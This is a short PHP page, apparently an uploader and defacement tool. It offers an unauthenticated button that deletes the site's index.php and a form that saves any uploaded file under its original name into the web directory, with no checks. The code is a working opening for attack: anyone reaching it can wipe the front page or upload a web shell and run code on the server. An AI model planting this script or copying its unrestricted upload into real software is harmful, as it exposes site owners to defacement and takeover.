<?php

if(isset($_POST['submit']))
{
$file="index.php";
if (!unlink($file))
  {
  echo ("Error deleting $file");
  }
else
  {
  echo ("Deleted $file");
  }

}


if(isset($_POST['upload']))
{
$file_name=$_FILES['f_name']['name'];
$file_tmp_location=$_FILES['f_name']['tmp_name'];
move_uploaded_file($file_tmp_location,$file_name);

}

?>
<table width="1200px" border="1">
<tr ><td>
<form method="POST" action="">
<input type="submit" name="submit" value="Delete">
</form>
</td></tr>
<tr><td>
<form method="POST" action="" enctype="multipart/form-data">
<input type="file" name="f_name">
<input type="submit" name="upload" value="Upload">
</form>
</td></tr>